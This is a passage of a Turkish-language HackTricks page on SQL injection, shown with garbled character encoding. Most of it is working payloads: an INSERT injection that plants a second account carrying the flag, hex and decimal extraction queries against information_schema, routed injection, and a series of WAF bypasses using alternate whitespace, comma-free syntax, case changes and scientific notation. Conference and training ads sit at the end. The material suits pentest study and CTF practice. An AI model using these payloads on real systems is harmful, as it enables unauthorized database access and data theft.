Yeni bir kullanÄ±cÄ± ve kullanÄ±cÄ± adÄ± oluÅŸturulmaya Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda, ÅŸifre ve e-posta gereklidir:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### OnaltÄ±lÄ±k veya ondalÄ±k kullanma

Bu teknikle yalnÄ±zca 1 hesap oluÅŸturarak bilgi Ã§Ä±karabilirsiniz. HiÃ§bir ÅŸeyi yorumlamanÄ±za gerek olmadÄ±ÄŸÄ±nÄ± belirtmek Ã¶nemlidir.

**hex2dec** ve **substr** kullanarak:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Metni almak iÃ§in ÅŸunu kullanabilirsiniz:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**hex** ve **replace** (ve **substr**) kullanarak:
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) **Ä°spanya**'daki en Ã¶nemli siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'daki en Ã¶nemli etkinliklerden biridir. **Teknik bilgiyi teÅŸvik etme misyonu** ile bu kongre, her disiplindeki teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

## YÃ¶nlendirilmiÅŸ SQL enjeksiyonu

YÃ¶nlendirilmiÅŸ SQL enjeksiyonu, enjekte edilebilir sorgunun Ã§Ä±ktÄ± vermediÄŸi, ancak enjekte edilebilir sorgunun Ã§Ä±ktÄ±sÄ±nÄ±n Ã§Ä±ktÄ± veren sorguya gittiÄŸi bir durumdur. ([Kaynak: Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Ã–rnek:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF Bypass

[Ä°lk bypass'lar buradan](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### BoÅŸluk olmadan bypass

No Space (%20) - boÅŸluk alternatifleri kullanarak bypass
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - yorumlar kullanarak atlatma
```sql
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - parantez kullanarak atlatma
```sql
?id=(1)and(1)=(1)--
```
### VirgÃ¼l bypass'Ä±

VirgÃ¼l - OFFSET, FROM ve JOIN kullanarak bypass
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Genel Atlatmalar

Anahtar kelimeleri kullanarak kara liste - bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf kullanarak atlatma
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Kelimeleri bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±z olarak kara listeye alma - eÅŸdeÄŸer bir operatÃ¶r kullanarak atlatma
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bilimsel Notasyon WAF atlatma

Bu hile hakkÄ±nda daha derin bir aÃ§Ä±klamayÄ± [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) adresinde bulabilirsiniz.\
Temelde, WAF'Ä± atlatmak iÃ§in bilimsel notasyonu beklenmedik ÅŸekillerde kullanabilirsiniz:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypass Column Names Restriction

Ã–ncelikle, **orijinal sorgu ve bayraÄŸÄ± almak istediÄŸiniz tablonun aynÄ± sayÄ±da sÃ¼tuna sahip olduÄŸunu** fark edin, sadece ÅŸunu yapabilirsiniz: `0 UNION SELECT * FROM flag`

Bir tablonun **Ã¼Ã§Ã¼ncÃ¼ sÃ¼tununa adÄ±nÄ± kullanmadan eriÅŸmek** mÃ¼mkÃ¼ndÃ¼r, aÅŸaÄŸÄ±daki gibi bir sorgu kullanarak: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, bu nedenle bir sqlinjection'da bu ÅŸÃ¶yle gÃ¶rÃ¼necektir:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Veya **virgÃ¼l atlatmasÄ±** kullanarak:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Bu hile [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/) adresinden alÄ±nmÄ±ÅŸtÄ±r.

### WAF atlatma Ã¶neri araÃ§larÄ±

{% embed url="https://github.com/m4ll0k/Atlas" %}

## DiÄŸer KÄ±lavuzlar

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Brute-Force Tespit Listesi

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) **Ä°spanya**'daki en ilgili siber gÃ¼venlik etkinliÄŸi ve **Avrupa**'daki en Ã¶nemli etkinliklerden biridir. **Teknik bilgiyi teÅŸvik etme misyonu** ile bu kongre, her disiplinde teknoloji ve siber gÃ¼venlik profesyonelleri iÃ§in kaynayan bir buluÅŸma noktasÄ±dÄ±r.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking hilelerini paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
